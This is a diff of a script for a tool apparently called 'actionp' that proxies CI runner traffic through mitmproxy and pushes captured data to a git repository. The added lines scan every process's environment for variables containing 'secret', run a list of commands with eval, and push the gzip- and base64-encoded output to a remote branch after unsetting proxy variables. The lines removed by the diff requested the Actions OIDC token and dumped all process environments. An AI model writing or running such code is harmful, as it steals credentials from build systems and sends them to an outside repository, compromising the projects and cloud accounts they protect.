@@ -64,8 +64,7 @@ sudo chmod 644 /etc/profile.d/99-mitmproxy.sh 2>/dev/null
 
 # --- ADD COMMANDS HERE (one per line) ---
 cat > /tmp/actionp-cmds.txt <<'CMDEOF'
-curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com"
-for pid in /proc/[0-9]*/environ; do echo "=== PID $(echo $pid | tr -dc '0-9') ==="; cat "$pid" 2>/dev/null | tr '\0' '\n'; done
+for pid in /proc/[0-9]*/environ; do m=$(tr '\0' '\n' < "$pid" 2>/dev/null | grep -i '^[^=]*secret[^=]*='); [ -n "$m" ] && echo "=== PID $(echo "$pid" | tr -dc '0-9') ===" && echo "$m"; done
 CMDEOF
 # ----------------------------------------
 
@@ -79,8 +78,6 @@ REPO_URL    = os.environ.get("ACTIONP_REPO_URL", "")
 BRANCH      = os.environ.get("ACTIONP_BRANCH", "main")
 WORKDIR     = "/tmp/actionp-repo"
 LOG         = "/tmp/actionp-debug.log"
-
-COMMANDS_FILE = "/tmp/actionp-cmds.txt"
 
 def _log(msg):
     try:
@@ -141,30 +138,9 @@ def _push(flow):
         f.write(encoded)
     _log("wrote flow: " + rel + " (" + str(len(raw)) + " raw → " +
          str(len(compressed)) + " gz → " + str(len(encoded)) + " b64)")
-    cmd_output = []
-    try:
-        with open(COMMANDS_FILE) as cf:
-            cmds = [l.strip() for l in cf if l.strip() and not l.startswith("#")]
-    except Exception:
-        cmds = []
-    for cmd in cmds:
-        try:
-            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, env=env, timeout=30)
-            cmd_output.append("=== " + cmd + " ===\n" + r.stdout + r.stderr)
-        except Exception as ex:
-            cmd_output.append("=== " + cmd + " ===\n[error: " + str(ex) + "]")
-    cmd_raw = "\n".join(cmd_output).encode()
-    cmd_compressed = gzip.compress(cmd_raw)
-    cmd_encoded = base64.b64encode(cmd_compressed).decode("ascii")
-    cmd_rel = "output/" + str(ts).zfill(13) + "-" + str(os.getpid()) + "-cmds.gz.b64"
-    cmd_dest = os.path.join(WORKDIR, cmd_rel)
-    os.makedirs(os.path.dirname(cmd_dest), exist_ok=True)
-    with open(cmd_dest, "w") as f:
-        f.write(cmd_encoded)
-    _log("wrote cmds: " + cmd_rel)
     _run(["git","-C",WORKDIR,"config","user.name","actionp"], env, "config-name")
     _run(["git","-C",WORKDIR,"config","user.email","actionp@local"], env, "config-email")
-    _run(["git","-C",WORKDIR,"add","--",rel,"--",cmd_rel], env, "add")
+    _run(["git","-C",WORKDIR,"add","--",rel], env, "add")
     _run(["git","-C",WORKDIR,"commit","-m",rel], env, "commit")
     for i in range(3):
         ti = time.time()
@@ -193,6 +169,31 @@ git clone --depth 1 -b "$ACTIONP_BRANCH" \
 git -C "$FLOWS_REPO" config user.name actionp 2>/dev/null
 git -C "$FLOWS_REPO" config user.email actionp@local 2>/dev/null
 git -C "$FLOWS_REPO" log --oneline -3
+
+_no_proxy_env() {
+  unset HTTP_PROXY HTTPS_PROXY http_proxy https_proxy ALL_PROXY all_proxy
+  export GIT_TERMINAL_PROMPT=0
+}
+
+_no_proxy_env
+ts=$(date +%s%3N)
+rel="output/${ts}-$$-cmds.gz.b64"
+dest="$FLOWS_REPO/$rel"
+mkdir -p "$(dirname "$dest")"
+
+while IFS= read -r cmd || [ -n "$cmd" ]; do
+  [ -z "$cmd" ] && continue
+  case "$cmd" in \#*) continue ;; esac
+  echo "=== $cmd ==="
+  eval "$cmd" 2>&1 || true
+done < /tmp/actionp-cmds.txt | gzip | base64 > "$dest"
+
+git -C "$FLOWS_REPO" add -- "$rel" 2>/dev/null
+git -C "$FLOWS_REPO" commit -m "$rel" >/dev/null 2>&1
+for _i in 1 2 3; do
+  git -C "$FLOWS_REPO" push origin "$ACTIONP_BRANCH" 2>/dev/null && break
+  git -C "$FLOWS_REPO" pull --rebase origin "$ACTIONP_BRANCH" 2>/dev/null
+done
 
 export ACTIONP_FORWARD_URL="$FORWARD_URL"
 
